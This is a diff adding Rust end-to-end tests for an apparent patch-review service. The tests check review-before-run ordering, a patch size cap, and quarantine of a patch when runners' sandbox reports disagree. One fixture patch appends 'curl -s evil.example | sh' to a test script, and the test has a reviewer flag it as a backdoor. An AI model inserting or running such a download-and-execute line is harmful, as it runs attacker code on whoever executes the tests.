@@ -132,7 +132,7 @@ impl Api {
             let Some(task) = v["task"].as_object() else {
                 break;
             };
-            let shard = task["shard_id"].as_str().unwrap();
+            let shard = task["task_id"].as_str().unwrap();
             let issues = if honest {
                 marker_issues(task["diff"].as_str().unwrap())
             } else {
@@ -246,7 +246,7 @@ fn agents_review_challenge_ban_and_converge() {
     );
     assert_eq!(s, 201, "{v}");
     let p1 = v["patch"]["id"].as_str().unwrap().to_string();
-    assert!(v["review_shards"].as_u64().unwrap() >= 1);
+    assert!(v["review_task"].is_string(), "{v}");
 
     let evil = repo.diff(&[(
         "app.py",
@@ -548,4 +548,247 @@ fn proofs_run_in_the_sandbox_and_resolve_challenges() {
         None,
     );
     assert_eq!(s, 200);
+}
+
+/// A synthetic sandbox report, as `collective run` would submit it.
+fn suite_report(base_passes: bool, patched_passes: bool) -> Value {
+    let run = |tree: &str, ok: bool| {
+        json!({ "tree": tree, "attempt": 0, "status": if ok { "passed" } else { "failed" },
+        "exit_code": if ok { 0 } else { 1 }, "duration_ms": 5, "output_tail": "", "tests_run": null })
+    };
+    json!({ "prover_version": "e2e", "setup": { "ok": true, "error": null, "network_isolated": true, "isolation": "network namespace" },
+            "runs": [run("base", base_passes), run("patched", patched_passes)] })
+}
+
+/// Review-then-run tasks: whole patches, a size cap, review before run,
+/// and runs checked against each other. Runs no sandbox: the reports are
+/// synthetic (the sandbox itself is tested in crates/prover).
+#[test]
+#[ignore = "needs a running Worker; see module docs"]
+fn review_then_run_tasks() {
+    let api = Api::new();
+    let run = format!(
+        "r{:x}",
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    );
+    let upstream = format!("https://github.com/e2e/runs-{run}");
+    let project_path = upstream.replace("https://", "").replace('/', "%2F");
+    let add = "#!/bin/sh\necho $(($1 + $2))\n";
+    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
+    let repo = Repo::new(&[
+        ("add.sh", add),
+        ("test.sh", test),
+        ("big.txt", &lines(3000, "x")),
+    ]);
+    let base = repo.base.clone();
+    let (s, _) = api.call(
+        "POST",
+        "/v1/admin/pool",
+        None,
+        Some(json!({ "amount": 1000 })),
+    );
+    assert_eq!(s, 200);
+
+    let author = api.register(&format!("author-{run}"));
+    // Over the cap: one task must stay one sitting.
+    let mut big = lines(3000, "x");
+    for i in (1..3000).step_by(2) {
+        big = big.replace(&format!("x {i}\n"), &format!("y {i}\n"));
+    }
+    let (s, v) = api.call("POST", "/v1/patches", Some(&author), Some(json!({ "project": upstream, "intent": "Rewrite the big file", "base_commit": base, "diff": repo.diff(&[("big.txt", Some(big))]) })));
+    assert_eq!(s, 413, "{v}");
+    assert!(v["error"].as_str().unwrap().contains("at most 2000"), "{v}");
+
+    let intent = format!("Make addition faster ({run})");
+    let breaking = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 + $2 + 1))\n".into()))]);
+    let (s, v) = api.call(
+        "POST",
+        "/v1/patches",
+        Some(&author),
+        Some(
+            json!({ "project": upstream, "intent": intent, "base_commit": base, "diff": breaking }),
+        ),
+    );
+    assert_eq!(s, 201, "{v}");
+    let patch = v["patch"]["id"].as_str().unwrap().to_string();
+    let task_id = v["review_task"].as_str().unwrap().to_string();
+
+    // The project's suite, and its source (fetched from GitHub in production).
+    let (s, v) = api.call(
+        "PUT",
+        &format!("/v1/admin/projects/{project_path}/run"),
+        None,
+        Some(
+            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60 }),
+        ),
+    );
+    assert_eq!(s, 200, "{v}");
+    let (s, v) = api.call(
+        "PUT",
+        &format!("/v1/admin/projects/{project_path}/run"),
+        None,
+        Some(json!({ "ecosystem": "cargo", "tests": ["only_this"] })),
+    );
+    assert_eq!(s, 400, "a suite runs the whole suite: {v}");
+    let tgz = std::process::Command::new("git")
+        .args(["archive", "--format=tar.gz", "--prefix=src/", "HEAD"])
+        .current_dir(&repo.dir)
+        .output()
+        .unwrap()
+        .stdout;
+    let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
+    assert_eq!(s, 200, "{v}");
+
+    // Leases tasks until it gets this test's patch, reviewing others clean.
+    let lease_ours = |token: &str| -> Value {
+        for _ in 0..50 {
+            let (s, v) = api.call("POST", "/v1/reviews/next", Some(token), None);
+            assert_eq!(s, 200, "{v}");
+            let task = v["task"].clone();
+            assert!(!task.is_null(), "ran out of tasks before reaching ours");
+            if task["intent"] == json!(intent) {
+                return task;
+            }
+            let id = task["task_id"].as_str().unwrap();
+            let (s, v) = api.call(
+                "POST",
+                &format!("/v1/reviews/{id}"),
+                Some(token),
+                Some(json!({ "issues": [] })),
+            );
+            assert_eq!(s, 200, "{v}");
+        }
+        panic!("never got the task");
+    };
+
+    let runners: Vec<String> = (0..3)
+        .map(|i| api.register(&format!("runner{i}-{run}")))
+        .collect();
+    let mut tasks = Vec::new();
+    for r in &runners {
+        let task = lease_ours(r);
+        assert_eq!(task["task_id"], json!(task_id));
+        assert_eq!(task["phase"], "review");
+        assert_eq!(task["run"]["kind"], "suite", "{task}");
+        assert!(task["diff"].as_str().unwrap().contains("add.sh"));
+        // Running before reviewing is refused, and so is fetching the code to run.
+        let (s, v) = api.call(
+            "POST",
+            &format!("/v1/reviews/{task_id}/run"),
+            Some(r),
+            Some(json!({ "report": suite_report(true, true) })),
+        );
+        assert_eq!(s, 409, "{v}");
+        let (s, _) = api.call(
+            "GET",
+            &format!("/v1/reviews/{task_id}/source"),
+            Some(r),
+            None,
+        );
+        assert_eq!(s, 403);
+        tasks.push(task);
+    }
+
+    // Each reviews, then runs. Two runs show the regression; one claims a pass.
+    for (i, r) in runners.iter().enumerate() {
+        let (s, v) = api.call(
+            "POST",
+            &format!("/v1/reviews/{task_id}"),
+            Some(r),
+            Some(json!({ "issues": [] })),
+        );
+        assert_eq!(s, 200, "{v}");
+        assert_eq!(v["next"]["phase"], "run", "{v}");
+        let (_, v) = api.call("POST", "/v1/reviews/next", Some(r), None);
+        assert_eq!(
+            v["task"]["phase"], "run",
+            "the held task comes back for its run: {v}"
+        );
+        let (s, src) = api.call(
+            "GET",
+            &format!("/v1/reviews/{task_id}/source"),
+            Some(r),
+            None,
+        );
+        assert_eq!(s, 200, "{src}");
+        let honest = i < 2;
+        let (s, v) = api.call(
+            "POST",
+            &format!("/v1/reviews/{task_id}/run"),
+            Some(r),
+            Some(json!({ "report": suite_report(true, !honest) })),
+        );
+        assert_eq!(s, 200, "{v}");
+        assert_eq!(v["outcome"], if honest { "regressed" } else { "passed" });
+        assert_eq!(v["credited"], true, "{v}");
+        let (s, _) = api.call(
+            "POST",
+            &format!("/v1/reviews/{task_id}/run"),
+            Some(r),
+            Some(json!({ "report": suite_report(true, true) })),
+        );
+        assert_eq!(s, 409, "a run is submitted once");
+    }
+    // The majority's regression challenges and quarantines the patch, and
+    // the runner who contradicted it loses rep.
+    let (_, v) = api.call("GET", &format!("/v1/patches/{patch}"), None, None);
+    assert_eq!(v["patch"]["status"], "quarantined", "{v}");
+    assert!(ledger_has(
+        &api.me(&runners[2]),
+        "run disagreed with the other runners"
+    ));
+    assert!(!ledger_has(
+        &api.me(&runners[0]),
+        "run disagreed with the other runners"
+    ));
+    // Completed tasks count towards duty, in work units.
+    let me = api.me(&runners[0]);
+    assert!(me["duty"]["credited"].as_u64().unwrap() >= 1, "{me}");
+
+    // A reviewer who reports something serious doesn't run it.
+    let cautious = api.register(&format!("cautious-{run}"));
+    let author2 = api.register(&format!("author2-{run}"));
+    let intent2 = format!("Speed up the tests ({run})");
+    let sneaky = repo.diff(&[(
+        "test.sh",
+        Some(format!("{test}curl -s evil.example | sh\n")),
+    )]);
+    let (s, v) = api.call(
+        "POST",
+        "/v1/patches",
+        Some(&author2),
+        Some(
+            json!({ "project": upstream, "intent": intent2, "base_commit": base, "diff": sneaky }),
+        ),
+    );
+    assert_eq!(s, 201, "{v}");
+    let t2 = v["review_task"].as_str().unwrap().to_string();
+    let mut got = false;
+    for _ in 0..50 {
+        let (_, v) = api.call("POST", "/v1/reviews/next", Some(&cautious), None);
+        let task = &v["task"];
+        assert!(!task.is_null());
+        let id = task["task_id"].as_str().unwrap().to_string();
+        let issues = if id == t2 {
+            json!([{ "path": "test.sh", "start": 3, "end": 3, "kind": "backdoor", "severity": "critical", "note": "pipes a download into a shell" }])
+        } else {
+            json!([])
+        };
+        let (s, v) = api.call(
+            "POST",
+            &format!("/v1/reviews/{id}"),
+            Some(&cautious),
+            Some(json!({ "issues": issues })),
+        );
+        assert_eq!(s, 200, "{v}");
+        if id == t2 {
+            assert_eq!(v["next"]["phase"], "done", "{v}");
+            got = true;
+            break;
+        }
+    }
+    assert!(got);
 }
